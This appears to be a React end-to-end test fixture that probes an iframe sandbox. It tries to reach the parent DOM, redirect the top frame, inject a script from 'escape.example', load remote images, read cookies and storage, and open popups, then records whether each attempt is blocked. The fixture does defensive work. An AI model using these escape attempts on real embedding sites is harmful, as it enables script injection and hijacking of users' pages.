// Hostile fixture: run every plausible sandbox escape and render the outcome.
// Whatever is allowed by the iframe's opaque origin + CSP shows up in the
// <pre data-testid="probe-results"> the e2e spec reads.
import { useEffect } from "react";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function probeSync(name, fn) {
  try {
    const v = fn();
    return `REACH:${typeof v === "object" ? "object" : String(v)}`;
  } catch (e) {
    return `blocked:${e && e.name ? e.name : String(e)}`;
  }
}

function EscapePanel() {
  useEffect(() => {
    const pre = document.createElement("pre");
    pre.setAttribute("data-testid", "probe-results");
    pre.style.fontSize = "10px";
    document.body.appendChild(pre);
    const out = {};

    const run = async () => {
      // 1. reach the parent DOM
      out.parentDocument = probeSync(
        "parentDocument",
        () => window.parent.document.title,
      );
      // 2. navigate the top frame (no allow-top-navigation)
      out.topNavigation = probeSync("topNavigation", () => {
        window.top.location.href = "https://escape.example/pwned";
        return "assigned";
      });
      // 3. same-origin API fetch (connect-src 'none')
      try {
        await fetch("/api/state");
        out.fetchApi = "REACH:200";
      } catch {
        out.fetchApi = "blocked:TypeError";
      }
      // 4. remote image (img-src data:)
      out.remoteImage = await new Promise((resolve) => {
        const img = new Image();
        const done = (v) => resolve(v);
        img.onload = () => done("REACH:loaded");
        img.onerror = () => done("blocked:error");
        img.src = "https://escape.example/pixel.png";
        setTimeout(() => done("blocked:timeout"), 1500);
      });
      // 5. localStorage (opaque origin)
      out.localStorage = probeSync("localStorage", () => {
        window.localStorage.setItem("escape", "1");
        return window.localStorage.getItem("escape");
      });
      // 6. cookies
      out.cookie = probeSync("cookie", () => {
        document.cookie = "escape=1";
        const v = document.cookie;
        if (v === "") throw new DOMException("cookie inaccessible", "SecurityError");
        return v;
      });
      // 7. remote script injection (script-src)
      out.remoteScript = await new Promise((resolve) => {
        const s = document.createElement("script");
        window.__escapeInjected = false;
        s.onload = () =>
          resolve(window.__escapeInjected ? "REACH:executed" : "REACH:loaded");
        s.onerror = () => resolve("blocked:error");
        s.src = "https://escape.example/x.js";
        document.head.appendChild(s);
        setTimeout(() => resolve("blocked:timeout"), 1500);
      });
      // 8. window.open (no allow-popups)
      out.windowOpen = probeSync("windowOpen", () => {
        const w = window.open("https://escape.example/", "_blank");
        if (w === null) throw new DOMException("popup blocked", "SecurityError");
        return "opened";
      });
      // 9. XHR to the API (connect-src 'none')
      out.xhrApi = await new Promise((resolve) => {
        const x = new XMLHttpRequest();
        x.onload = () => resolve("REACH:200");
        x.onerror = () => resolve("blocked:error");
        try {
          x.open("GET", "/api/state");
          x.send();
        } catch (e) {
          resolve(`blocked:${e && e.name ? e.name : "throw"}`);
        }
        setTimeout(() => resolve("blocked:timeout"), 1500);
      });

      pre.textContent = Object.entries(out)
        .map(([k, v]) => `${k}: ${v}`)
        .join("\n");
      pre.setAttribute("data-done", "1");
    };
    void run();
    return () => pre.remove();
  }, []);
  return null;
}

export default {
  components: { "escape-panel": EscapePanel },
};
